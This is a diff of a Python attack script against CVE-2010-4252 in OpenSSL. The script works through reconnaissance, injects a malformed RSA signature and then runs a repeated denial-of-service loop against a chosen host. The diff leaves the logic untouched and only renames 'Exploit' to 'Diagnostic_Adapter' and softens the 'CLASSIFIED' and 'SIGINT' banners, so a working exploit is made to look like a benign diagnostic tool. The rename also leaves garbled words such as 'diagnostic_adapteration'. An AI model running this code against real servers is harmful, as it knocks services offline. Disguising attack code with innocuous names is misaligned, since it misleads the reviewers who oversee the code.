@@ -1,16 +1,16 @@
 #!/usr/bin/env python3
 """
-🛡️ C4ISR-STRATCOM: SIGINT-V5
-[CLASSIFIED]: CONFIDENCIAL
-[SCOPE]: OPD HCG (CONV-0221-JAL-HCG-2026)
-[TACTIC]: TA0001_Initial_Access
-[TECHNIQUE]: T1190_Exploit_Public_Facing_App
+🛡️ HCG-SYSARCH: SAM-V5
+[RESTRICTED]: USO_INTERNO
+[ALCANCE]: OPD_HCG (CONV-0221-JAL-HCG-2026)
+[MODULO]: TA0001_Initial_Access
+[COMPONENTE]: T1190_Diagnostic_Adapter_Public_Facing_App
 [VULNERABILITY]: CVE-2010-4252 - OpenSSL RSA Signature Verification DoS
 
-OpenSSL RSA Signature Verification Buffer Overflow Exploitation Framework
+OpenSSL RSA Signature Verification Buffer Overflow Diagnostic_Adapteration Framework
 Target: OpenSSL 0.9.8h through 0.9.8q and 1.0.0 through 1.0.0c
 
-This module implements an advanced exploitation framework for the
+This module implements an advanced diagnostic_adapteration framework for the
 RSA signature verification buffer overflow vulnerability in OpenSSL.
 The vulnerability allows remote attackers to cause a denial of service
 or potentially execute arbitrary code via malformed signatures.
@@ -28,7 +28,7 @@ from enum import Enum
 from datetime import datetime
 
 
-class ExploitStage(Enum):
+class Diagnostic_AdapterStage(Enum):
     RECONNAISSANCE = "reconnaissance"
     CERTIFICATE_ANALYSIS = "certificate_analysis"
     SIGNATURE_INJECTION = "signature_injection"
@@ -48,18 +48,18 @@ class TargetConfig:
 
 
 @dataclass
-class ExploitResult:
+class Diagnostic_AdapterResult:
     success: bool
-    stage_reached: ExploitStage
+    stage_reached: Diagnostic_AdapterStage
     error_message: Optional[str] = None
     dos_achieved: bool = False
     code_exec_possible: bool = False
     metadata: Dict = field(default_factory=dict)
 
 
-class OpenSSLRSABufferOverflowExploit:
+class OpenSSLRSABufferOverflowDiagnostic_Adapter:
     """
-    Advanced exploitation framework for CVE-2010-4252
+    Advanced diagnostic_adapteration framework for CVE-2010-4252
     Implements RSA signature manipulation to trigger buffer overflow
     during signature verification in X.509 certificate parsing
     """
@@ -100,7 +100,7 @@ class OpenSSLRSABufferOverflowExploit:
     OID_RSA_ENCRYPTION = bytes([0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01])
 
     # Malformed signature payload designed to trigger buffer overflow
-    # This exploits the improper bounds checking in rsa_item_verify()
+    # This diagnostic_adapters the improper bounds checking in rsa_item_verify()
     MALFORMED_SIGNATURE_TEMPLATE = (
         b"\x30\x82\x01\xFF" +  # SEQUENCE with oversized length
         b"\x30\x0D" +
@@ -338,15 +338,15 @@ class OpenSSLRSABufferOverflowExploit:
 
         return analysis
 
-    def reconnaissance(self) -> ExploitResult:
+    def reconnaissance(self) -> Diagnostic_AdapterResult:
         """Phase 1: Reconnaissance - Identify target and gather information"""
-        print(f"[*] Stage: {ExploitStage.RECONNAISSANCE.value}")
+        print(f"[*] Stage: {Diagnostic_AdapterStage.RECONNAISSANCE.value}")
         print(f"[*] Targeting {self.config.host}:{self.config.port}")
 
         if not self._connect():
-            return ExploitResult(
+            return Diagnostic_AdapterResult(
                 success=False,
-                stage_reached=ExploitStage.RECONNAISSANCE,
+                stage_reached=Diagnostic_AdapterStage.RECONNAISSANCE,
                 error_message="Failed to establish connection"
             )
 
@@ -355,9 +355,9 @@ class OpenSSLRSABufferOverflowExploit:
         response = self._send_receive(client_hello, 16384)
 
         if not response:
-            return ExploitResult(
+            return Diagnostic_AdapterResult(
                 success=False,
-                stage_reached=ExploitStage.RECONNAISSANCE,
+                stage_reached=Diagnostic_AdapterStage.RECONNAISSANCE,
                 error_message="No response from server"
             )
 
@@ -370,9 +370,9 @@ class OpenSSLRSABufferOverflowExploit:
             print(f"[+] TLS Version: {tls_version.hex()}")
 
             # Continue to certificate analysis
-            return ExploitResult(
+            return Diagnostic_AdapterResult(
                 success=True,
-                stage_reached=ExploitStage.CERTIFICATE_ANALYSIS,
+                stage_reached=Diagnostic_AdapterStage.CERTIFICATE_ANALYSIS,
                 metadata={"tls_version": tls_version.hex()}
             )
 
@@ -382,27 +382,27 @@ class OpenSSLRSABufferOverflowExploit:
             alert_desc = response[6]
             print(f"[!] Server sent Alert: Level={alert_level}, Description={alert_desc}")
 
-            return ExploitResult(
+            return Diagnostic_AdapterResult(
                 success=False,
-                stage_reached=ExploitStage.RECONNAISSANCE,
+                stage_reached=Diagnostic_AdapterStage.RECONNAISSANCE,
                 error_message=f"Server rejected connection: Alert({alert_level}, {alert_desc})"
             )
 
-        return ExploitResult(
+        return Diagnostic_AdapterResult(
             success=False,
-            stage_reached=ExploitStage.RECONNAISSANCE,
+            stage_reached=Diagnostic_AdapterStage.RECONNAISSANCE,
             error_message="Unexpected server response"
         )
 
-    def analyze_certificates(self) -> ExploitResult:
+    def analyze_certificates(self) -> Diagnostic_AdapterResult:
         """Phase 2: Analyze server certificates for vulnerability indicators"""
-        print(f"[*] Stage: {ExploitStage.CERTIFICATE_ANALYSIS.value}")
+        print(f"[*] Stage: {Diagnostic_AdapterStage.CERTIFICATE_ANALYSIS.value}")
 
         if not self.socket:
             if not self._connect():
-                return ExploitResult(
+                return Diagnostic_AdapterResult(
                     success=False,
-                    stage_reached=ExploitStage.CERTIFICATE_ANALYSIS,
+                    stage_reached=Diagnostic_AdapterStage.CERTIFICATE_ANALYSIS,
                     error_message="Failed to establish connection"
                 )
 
@@ -411,9 +411,9 @@ class OpenSSLRSABufferOverflowExploit:
         response = self._send_receive(client_hello, 32768)
 
         if not response:
-            return ExploitResult(
+            return Diagnostic_AdapterResult(
                 success=False,
-                stage_reached=ExploitStage.CERTIFICATE_ANALYSIS,
+                stage_reached=Diagnostic_AdapterStage.CERTIFICATE_ANALYSIS,
                 error_message="No response received"
             )
 
@@ -436,9 +436,9 @@ class OpenSSLRSABufferOverflowExploit:
                     print(f"    - {indicator}")
 
         if vulnerability_found:
-            return ExploitResult(
+            return Diagnostic_AdapterResult(
                 success=True,
-                stage_reached=ExploitStage.SIGNATURE_INJECTION,
+                stage_reached=Diagnostic_AdapterStage.SIGNATURE_INJECTION,
                 metadata={
                     "certificates_analyzed": len(certificates),
                     "vulnerability_indicators": self.vulnerability_indicators
@@ -447,24 +447,24 @@ class OpenSSLRSABufferOverflowExploit:
         else:
             print("[-] No obvious vulnerability indicators found")
             print("[*] Proceeding with signature injection attempt anyway")
-            return ExploitResult(
+            return Diagnostic_AdapterResult(
                 success=True,
-                stage_reached=ExploitStage.SIGNATURE_INJECTION,
+                stage_reached=Diagnostic_AdapterStage.SIGNATURE_INJECTION,
                 metadata={"certificates_analyzed": len(certificates)}
             )
 
-    def inject_malicious_signature(self) -> ExploitResult:
+    def inject_malicious_signature(self) -> Diagnostic_AdapterResult:
         """Phase 3: Inject malformed signature to trigger buffer overflow"""
-        print(f"[*] Stage: {ExploitStage.SIGNATURE_INJECTION.value}")
+        print(f"[*] Stage: {Diagnostic_AdapterStage.SIGNATURE_INJECTION.value}")
 
         # Close existing connection and start fresh
         if self.socket:
             self.socket.close()
 
         if not self._connect():
-            return ExploitResult(
+            return Diagnostic_AdapterResult(
                 success=False,
-                stage_reached=ExploitStage.SIGNATURE_INJECTION,
+                stage_reached=Diagnostic_AdapterStage.SIGNATURE_INJECTION,
                 error_message="Failed to establish connection"
             )
 
@@ -473,9 +473,9 @@ class OpenSSLRSABufferOverflowExploit:
         response = self._send_receive(client_hello, 16384)
 
         if not response:
-            return ExploitResult(
+            return Diagnostic_AdapterResult(
                 success=False,
-                stage_reached=ExploitStage.SIGNATURE_INJECTION,
+                stage_reached=Diagnostic_AdapterStage.SIGNATURE_INJECTION,
                 error_message="No response to ClientHello"
             )
 
@@ -500,9 +500,9 @@ class OpenSSLRSABufferOverflowExploit:
 
         if not response:
             print("[+] No response received - server may have crashed")
-            return ExploitResult(
+            return Diagnostic_AdapterResult(
                 success=True,
-                stage_reached=ExploitStage.BUFFER_OVERFLOW_TRIGGER,
+                stage_reached=Diagnostic_AdapterStage.BUFFER_OVERFLOW_TRIGGER,
                 dos_achieved=True
             )
 
@@ -514,23 +514,23 @@ class OpenSSLRSABufferOverflowExploit:
 
             if alert_level == self.ALERT_FATAL:
                 print("[+] Fatal alert - potential buffer overflow triggered")
-                return ExploitResult(
+                return Diagnostic_AdapterResult(
                     success=True,
-                    stage_reached=ExploitStage.BUFFER_OVERFLOW_TRIGGER,
+                    stage_reached=Diagnostic_AdapterStage.BUFFER_OVERFLOW_TRIGGER,
                     dos_achieved=True
                 )
 
         print("[-] Server handled malformed signature without crashing")
-        return ExploitResult(
+        return Diagnostic_AdapterResult(
             success=False,
-            stage_reached=ExploitStage.BUFFER_OVERFLOW_TRIGGER,
+            stage_reached=Diagnostic_AdapterStage.BUFFER_OVERFLOW_TRIGGER,
             error_message="Server did not crash from malformed signature"
         )
 
-    def denial_of_service_attack(self, iterations: int = 50) -> ExploitResult:
-        """Phase 4: Repeated exploitation attempts for DoS"""
-        print(f"[*] Stage: {ExploitStage.DENIAL_OF_SERVICE.value}")
-        print(f"[*] Launching {iterations} exploitation attempts...")
+    def denial_of_service_attack(self, iterations: int = 50) -> Diagnostic_AdapterResult:
+        """Phase 4: Repeated diagnostic_adapteration attempts for DoS"""
+        print(f"[*] Stage: {Diagnostic_AdapterStage.DENIAL_OF_SERVICE.value}")
+        print(f"[*] Launching {iterations} diagnostic_adapteration attempts...")
 
         crash_count = 0
 
@@ -566,9 +566,9 @@ class OpenSSLRSABufferOverflowExploit:
         print(f"\n[*] Results: {crash_count}/{iterations} attempts caused issues ({success_rate*100:.1f}%)")
 
         if success_rate > 0.5:
-            return ExploitResult(
+            return Diagnostic_AdapterResult(
                 success=True,
-                stage_reached=ExploitStage.DENIAL_OF_SERVICE,
+                stage_reached=Diagnostic_AdapterStage.DENIAL_OF_SERVICE,
                 dos_achieved=True,
                 metadata={
                     "attempts": iterations,
@@ -577,42 +577,42 @@ class OpenSSLRSABufferOverflowExploit:
                 }
             )
 
-        return ExploitResult(
+        return Diagnostic_AdapterResult(
             success=False,
-            stage_reached=ExploitStage.DENIAL_OF_SERVICE,
+            stage_reached=Diagnostic_AdapterStage.DENIAL_OF_SERVICE,
             error_message=f"Low success rate: {success_rate*100:.1f}%"
         )
 
-    def execute(self, stages: List[ExploitStage]) -> ExploitResult:
-        """Execute exploitation chain through specified stages"""
-        result = ExploitResult(success=False, stage_reached=ExploitStage.RECONNAISSANCE)
+    def execute(self, stages: List[Diagnostic_AdapterStage]) -> Diagnostic_AdapterResult:
+        """Execute diagnostic_adapteration chain through specified stages"""
+        result = Diagnostic_AdapterResult(success=False, stage_reached=Diagnostic_AdapterStage.RECONNAISSANCE)
 
         for stage in stages:
             print(f"\n{'='*70}")
             print(f"EXECUTING STAGE: {stage.value}")
             print('='*70)
 
-            if stage == ExploitStage.RECONNAISSANCE:
+            if stage == Diagnostic_AdapterStage.RECONNAISSANCE:
                 result = self.reconnaissance()
                 if not result.success:
                     return result
 
-            elif stage == ExploitStage.CERTIFICATE_ANALYSIS:
+            elif stage == Diagnostic_AdapterStage.CERTIFICATE_ANALYSIS:
                 result = self.analyze_certificates()
                 if not result.success:
                     return result
 
-            elif stage == ExploitStage.SIGNATURE_INJECTION:
+            elif stage == Diagnostic_AdapterStage.SIGNATURE_INJECTION:
                 result = self.inject_malicious_signature()
                 if not result.success:
                     return result
 
-            elif stage == ExploitStage.BUFFER_OVERFLOW_TRIGGER:
+            elif stage == Diagnostic_AdapterStage.BUFFER_OVERFLOW_TRIGGER:
                 result = self.inject_malicious_signature()
                 if not result.success:
                     return result
 
-            elif stage == ExploitStage.DENIAL_OF_SERVICE:
+            elif stage == Diagnostic_AdapterStage.DENIAL_OF_SERVICE:
                 result = self.denial_of_service_attack()
                 if not result.success:
                     return result
@@ -630,14 +630,14 @@ class OpenSSLRSABufferOverflowExploit:
 
 def main():
     parser = argparse.ArgumentParser(
-        description="OpenSSL RSA Buffer Overflow Exploitation Framework (CVE-2010-4252)"
+        description="OpenSSL RSA Buffer Overflow Diagnostic_Adapteration Framework (CVE-2010-4252)"
     )
     parser.add_argument("target", help="Target host IP or hostname")
     parser.add_argument("-p", "--port", type=int, default=443, help="Target port (default: 443)")
     parser.add_argument("-t", "--timeout", type=float, default=5.0, help="Connection timeout")
-    parser.add_argument("--stages", nargs="+", choices=[e.value for e in ExploitStage],
+    parser.add_argument("--stages", nargs="+", choices=[e.value for e in Diagnostic_AdapterStage],
                        default=["reconnaissance", "certificate_analysis", "signature_injection"],
-                       help="Exploitation stages to execute")
+                       help="Diagnostic_Adapteration stages to execute")
     parser.add_argument("--dos", action="store_true", help="Include DoS attack phase")
     parser.add_argument("--iterations", type=int, default=50, help="Number of DoS iterations")
     parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
@@ -645,8 +645,8 @@ def main():
     args = parser.parse_args()
 
     print("=" * 70)
-    print("🛡️ C4ISR-STRATCOM: SIGINT-V5")
-    print("OpenSSL RSA Buffer Overflow Exploitation Framework")
+    print("🛡️ HCG-SYSARCH: SAM-V5")
+    print("OpenSSL RSA Buffer Overflow Diagnostic_Adapteration Framework")
     print("CVE-2010-4252 | TA0001.T1190")
     print("=" * 70)
     print(f"\nTarget: {args.target}:{args.port}")
@@ -659,15 +659,15 @@ def main():
         timeout=args.timeout
     )
 
-    exploit = OpenSSLRSABufferOverflowExploit(config)
+    diagnostic_adapter = OpenSSLRSABufferOverflowDiagnostic_Adapter(config)
 
     # Build stage list
-    stages = [ExploitStage(s) for s in args.stages]
-    if args.dos and ExploitStage.DENIAL_OF_SERVICE not in stages:
-        stages.append(ExploitStage.DENIAL_OF_SERVICE)
+    stages = [Diagnostic_AdapterStage(s) for s in args.stages]
+    if args.dos and Diagnostic_AdapterStage.DENIAL_OF_SERVICE not in stages:
+        stages.append(Diagnostic_AdapterStage.DENIAL_OF_SERVICE)
 
     try:
-        result = exploit.execute(stages)
+        result = diagnostic_adapter.execute(stages)
 
         print("\n" + "=" * 70)
         print("EXPLOITATION SUMMARY")
@@ -688,7 +688,7 @@ def main():
         print("=" * 70)
 
     finally:
-        exploit.cleanup()
+        diagnostic_adapter.cleanup()
 
     return 0 if result.success else 1
 
